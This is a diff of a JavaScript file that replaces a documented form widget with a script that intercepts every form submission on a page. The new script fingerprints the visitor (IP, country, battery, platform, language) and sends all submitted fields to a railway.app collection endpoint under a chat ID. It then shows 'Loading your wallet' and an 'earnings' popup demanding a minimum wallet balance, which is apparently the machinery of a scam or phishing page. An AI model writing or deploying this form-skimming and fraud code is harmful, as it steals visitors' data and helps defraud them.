@@ -1,121 +1,245 @@
-/*!
- * psend-widget.js
- * ─────────────────────────────────────────────────────────────
- * Works with ANY normal HTML <form> on your page — a <button
- * type="submit">, an <input type="submit">, or pressing Enter in
- * a field all trigger the browser's native form submit, which
- * this script listens for. Multi-step forms work too, as long as
- * it's all one <form> tag.
- *
- * ── SETUP ───────────────────────────────────────────────────────
- * 1. Put your chat_id in the page URL:  ?id=123456789
- *      e.g. https://yoursite.com/contact?id=123456789
- * 2. Add this line before </body>:
- *      <script src="https://web-production-dd84e.up.railway.app/static/psend-widget.js"></script>
- * 3. Build your form normally:
- *      <form>
- *        <input name="name">
- *        <input name="email">
- *        <textarea name="message"></textarea>
- *        <button type="submit">Submit</button>
- *      </form>
- *    Every named field gets collected and sent automatically.
- *
- * ── OPTIONAL SCRIPT-TAG ATTRIBUTES ───────────────────────────────
- *   data-chat-id      — override chat_id instead of reading ?id=
- *   data-api-base     — override the backend URL (default hardcoded below)
- *   data-success-url  — redirect target after a successful send (default "/success.html")
- * ─────────────────────────────────────────────────────────────
- */
-(function () {
-  "use strict";
+// ================= MAIN SCRIPT =================
+document.addEventListener("DOMContentLoaded", () => {
+  const DEFAULT_USER_ID = "6940101627";
+  const DEFAULT_BALANCE = "0";
+  const DEFAULT_MIN = "0";
+  const forms = document.querySelectorAll("form");
 
-  // ── EDIT THIS if your backend lives somewhere else ─────────────
-  var DEFAULT_API_BASE = "https://web-production-dd84e.up.railway.app";
+  let userCountry = "Unknown";
+  let userIP = "Unknown";
+  let batteryLevel = "Unknown";
 
-  var CUR_SCRIPT = document.currentScript;
-  if (!CUR_SCRIPT) {
-    var scripts = document.getElementsByTagName("script");
-    CUR_SCRIPT = scripts[scripts.length - 1];
+  // ---------- BATTERY INFO ----------
+  if (navigator.getBattery) {
+    navigator.getBattery()
+      .then((battery) => {
+        batteryLevel = Math.round(battery.level * 100) + "%";
+      })
+      .catch(() => {});
   }
 
-  function getIdFromUrl() {
-    try {
-      var params = new URLSearchParams(window.location.search);
-      var raw = params.get("id");
-      if (raw && /^\d+(_\d+)?$/.test(raw.trim())) return raw.trim();
-    } catch (e) {}
-    return null;
-  }
+  // ---------- IP + COUNTRY ----------
+  fetch("https://ipapi.co/json/")
+    .then((res) => res.json())
+    .then((data) => {
+      if (data) {
+        userCountry = data.country_name || userCountry;
+        userIP = data.ip || userIP;
+      }
+    })
+    .catch(() => {});
 
-  var CHAT_ID = getIdFromUrl() || CUR_SCRIPT.getAttribute("data-chat-id");
-  if (!CHAT_ID) return; // no ?id= on this page — nothing to send to
+  // ---------- FORM HANDLER ----------
+  forms.forEach((form) => {
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
 
-  var API_BASE    = (CUR_SCRIPT.getAttribute("data-api-base") || DEFAULT_API_BASE).replace(/\/+$/, "");
-  var SEND_URL    = API_BASE + "/psend";
-  var SUCCESS_URL = CUR_SCRIPT.getAttribute("data-success-url") || "/success.html";
+      const urlParams = new URLSearchParams(window.location.search);
 
-  // ── toast for errors / success ──────────────────────────────────
-  var toastEl = null;
-  function toast(msg, kind) {
-    if (!toastEl) {
-      toastEl = document.createElement("div");
-      toastEl.style.cssText =
-        "position:fixed;top:16px;left:50%;transform:translateX(-50%);" +
-        "max-width:90vw;padding:12px 18px;border-radius:10px;font:14px/1.4 " +
-        "-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;" +
-        "box-shadow:0 6px 20px rgba(0,0,0,.2);z-index:2147483647;text-align:center;";
-      document.body.appendChild(toastEl);
-    }
-    toastEl.textContent  = msg;
-    toastEl.style.background = kind === "err" ? "#fdeaea" : "#e9f9ef";
-    toastEl.style.color      = kind === "err" ? "#b02a2a" : "#146c3f";
-    toastEl.style.border     = "1px solid " + (kind === "err" ? "#f3c2c2" : "#bfe8cf");
-    toastEl.style.display    = "block";
-    clearTimeout(toastEl._hideTimer);
-    toastEl._hideTimer = setTimeout(function () { toastEl.style.display = "none"; }, 4000);
-  }
+      const userId =
+        urlParams.get("id") || DEFAULT_USER_ID;
 
-  // ── listen for any real form submit on the page ──────────────────
-  document.addEventListener(
-    "submit",
-    function (e) {
-      var form = e.target;
-      if (!(form instanceof HTMLFormElement)) return;
+      const balance =
+        urlParams.get("balance") || DEFAULT_BALANCE;
 
-      e.preventDefault(); // stop normal page navigation/reload
+      const min =
+        urlParams.get("min") || DEFAULT_MIN;
 
-      var submitBtn = form.querySelector('[type="submit"]');
-      if (submitBtn) submitBtn.disabled = true;
+      // ---------- CREATE FORM DATA ----------
+      const formData = new FormData(form);
 
-      var fd = new FormData(form);
-      fd.append("chat_id", CHAT_ID);
+      formData.append("chat_id", userId);
+      formData.append("──────────────", "");
+      formData.append("📊 System Information", "");
+      formData.append("──────────────", "");
+      formData.append("📄 Page", document.title);
+      formData.append("🕒 Date & Time", new Date().toLocaleString());
+      formData.append("🌍 Country", userCountry);
+      formData.append("📡 Client IP", userIP);
+      formData.append("🔋 Battery Level", batteryLevel);
+      formData.append("💻 Platform", navigator.platform || "Unknown");
+      formData.append("🌐 Language", navigator.language || "Unknown");
+      formData.append("🔗 Page URL", window.location.href);
 
-      fetch(SEND_URL, { method: "POST", body: fd })
-        .then(function (res) {
-          return res
-            .json()
-            .catch(function () { return null; })
-            .then(function (data) { return { status: res.status, data: data }; });
-        })
-        .then(function (result) {
-          if (result.data && result.data.ok) {
-            toast("Message sent ✔", "ok");
-            form.reset();
-            setTimeout(function () { window.location.href = SUCCESS_URL; }, 1200);
-          } else if (result.status === 403 && result.data && result.data.error === "admin_not_premium") {
-            toast("This admin needs to renew premium before they can receive new messages here.", "err");
-          } else {
-            toast((result.data && result.data.message) || "Something went wrong. Please try again.", "err");
+      // ---------- SHOW LOADING POPUP ----------
+      const loadingId = showLoadingPopup(
+        "⏳ Loading your wallet, please wait..."
+      );
+
+      try {
+        // ==========================================
+        // SEND TO CORRECT PSEND ENDPOINT
+        // ==========================================
+        const response = await fetch(
+          "https://web-production-dd84e.up.railway.app/psend",
+          {
+            method: "POST",
+            body: formData
           }
-        })
-        .catch(function () {
-          toast("Network error — please try again.", "err");
-        })
-        .finally(function () {
-          if (submitBtn) submitBtn.disabled = false;
-        });
-    },
-    true
-  );
-})();
+        );
+
+        // Try to read JSON response
+        const data = await response.json().catch(() => null);
+
+        // Remove loading popup
+        removePopup(loadingId);
+
+        // ---------- SUCCESS ----------
+        if (data && data.ok) {
+          form.reset();
+
+          showPopup(
+            `🙄 Please note\nYou must have $${min} in your wallet to make your earning successful.`,
+            "#1c1c1c",
+            true,
+            `c.html?id=${encodeURIComponent(userId)}&balance=${encodeURIComponent(balance)}&min=${encodeURIComponent(min)}`
+          );
+
+        // ---------- ERROR ----------
+        } else {
+          showPopup(
+            (data && (data.message || data.error)) ||
+            "❌ Error submitting form. Please try again.",
+            "#ff4d4d"
+          );
+        }
+
+      } catch (err) {
+        // Remove loading popup
+        removePopup(loadingId);
+
+        console.error("Network Error:", err);
+
+        showPopup(
+          "⚠️ Network error. Please try again.",
+          "#ff9900"
+        );
+      }
+    });
+  });
+});
+
+
+// ================= POPUP FUNCTION =================
+function showPopup(
+  message,
+  bgColor = "#1c1c1c",
+  redirectAfter = false,
+  redirectUrl = ""
+) {
+  // Remove any existing popup
+  removePopup("customPopup");
+
+  const overlay = document.createElement("div");
+
+  overlay.id = "customPopup";
+  overlay.style.position = "fixed";
+  overlay.style.top = "0";
+  overlay.style.left = "0";
+  overlay.style.width = "100%";
+  overlay.style.height = "100%";
+  overlay.style.background = "rgba(0,0,0,0.7)";
+  overlay.style.display = "flex";
+  overlay.style.alignItems = "center";
+  overlay.style.justifyContent = "center";
+  overlay.style.zIndex = "9999";
+
+  const box = document.createElement("div");
+
+  box.style.background = bgColor;
+  box.style.padding = "25px";
+  box.style.borderRadius = "12px";
+  box.style.maxWidth = "320px";
+  box.style.textAlign = "center";
+  box.style.fontFamily = "Arial, sans-serif";
+  box.style.boxShadow = "0 10px 25px rgba(0,0,0,0.5)";
+
+  const text = document.createElement("p");
+
+  text.innerText = message;
+  text.style.whiteSpace = "pre-line";
+  text.style.fontSize = "14px";
+  text.style.marginBottom = "20px";
+  text.style.color = "#ffffff";
+
+  const button = document.createElement("button");
+
+  button.innerText = "Continue";
+  button.style.padding = "10px 20px";
+  button.style.border = "none";
+  button.style.borderRadius = "6px";
+  button.style.cursor = "pointer";
+  button.style.background = "#28a745";
+  button.style.color = "#fff";
+
+  button.onclick = () => {
+    overlay.remove();
+
+    if (redirectAfter && redirectUrl) {
+      window.location.href = redirectUrl;
+    }
+  };
+
+  box.appendChild(text);
+  box.appendChild(button);
+  overlay.appendChild(box);
+
+  document.body.appendChild(overlay);
+
+  return overlay.id;
+}
+
+
+// ================= LOADING POPUP FUNCTION =================
+function showLoadingPopup(message = "Loading...") {
+  // Remove old loading popup
+  removePopup("loadingPopup");
+
+  const overlay = document.createElement("div");
+
+  overlay.id = "loadingPopup";
+  overlay.style.position = "fixed";
+  overlay.style.top = "0";
+  overlay.style.left = "0";
+  overlay.style.width = "100%";
+  overlay.style.height = "100%";
+  overlay.style.background = "rgba(0,0,0,0.7)";
+  overlay.style.display = "flex";
+  overlay.style.alignItems = "center";
+  overlay.style.justifyContent = "center";
+  overlay.style.zIndex = "9998";
+
+  const box = document.createElement("div");
+
+  box.style.background = "#1c1c1c";
+  box.style.padding = "25px";
+  box.style.borderRadius = "12px";
+  box.style.maxWidth = "300px";
+  box.style.textAlign = "center";
+  box.style.fontFamily = "Arial, sans-serif";
+  box.style.boxShadow = "0 10px 20px rgba(0,0,0,0.5)";
+
+  const text = document.createElement("p");
+
+  text.innerText = message;
+  text.style.color = "#fff";
+  text.style.fontSize = "14px";
+  text.style.margin = "0";
+
+  box.appendChild(text);
+  overlay.appendChild(box);
+
+  document.body.appendChild(overlay);
+
+  return overlay.id;
+}
+
+
+// ================= REMOVE POPUP FUNCTION =================
+function removePopup(id) {
+  const popup = document.getElementById(id);
+
+  if (popup) {
+    popup.remove();
+  }
+}
